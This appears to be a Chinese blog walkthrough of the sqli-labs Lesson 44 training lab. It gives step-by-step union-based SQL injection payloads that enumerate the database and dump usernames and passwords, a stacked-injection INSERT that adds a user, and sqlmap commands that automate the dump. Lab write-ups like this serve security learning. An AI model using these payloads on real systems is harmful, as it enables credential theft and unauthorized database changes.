---
title: sqli-labs lession-44 POST基于错误-字符型-堆叠盲注
date: 2018-10-21 21:07:08
tags: [sqli-labs]
categories: sql注入
---

# sqli-labs lession-44 POST基于错误-字符型-堆叠盲注

---

## 分析

![001](/img/sql/Lesson-44/001.png)

由于是盲注,已经没有报错信息回显了。但是方式还是有的。

## 注入

### 获取列数

`0' union select 1,2,3;#`

![002](/img/sql/Lesson-44/002.png)

![003](/img/sql/Lesson-44/003.png)

### 获取数据库名

`0' union select 1,database(),3;#`

![004](/img/sql/Lesson-44/004.png)

![005](/img/sql/Lesson-44/005.png)

### 获取表名

`0' union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3;#`

![006](/img/sql/Lesson-44/006.png)

![007](/img/sql/Lesson-44/007.png)

### 获取列名

`0' union select 1,(select group_concat(column_name) from information_schema.columns where table_schema='security' and table_name='users'),3;#`

![008](/img/sql/Lesson-44/008.png)

![009](/img/sql/Lesson-44/009.png)

### 获取字段

`0' union select 1,(select group_concat(id,0x7e,username,0x7e,password) from users),3;#`

![0110](/img/sql/Lesson-44/010.png)

![011](/img/sql/Lesson-44/011.png)

## 堆叠注入

插入用户

`0';INSERT INTO users(username, password) VALUES ("hacker", "123456");#`

![012](/img/sql/Lesson-44/012.png)

插入用户成功。

## SQLMAP

![013](/img/sql/Lesson-44/013.png)

`sqlmap -r post/post_44.txt -p login_password --method POST --dbms mysql --technique B --threads 20 --level 2 --risk 3 --flush-session --fresh-queries -v 3`

![014](/img/sql/Lesson-44/014.png)

找到payload之后直接上结果吧。

`sqlmap -r post/post_44.txt -p login_password --method POST --dbms mysql --technique B --threads 20 --level 2 --risk 3 -D security -T users --columns --dump`

![015](/img/sql/Lesson-44/015.png)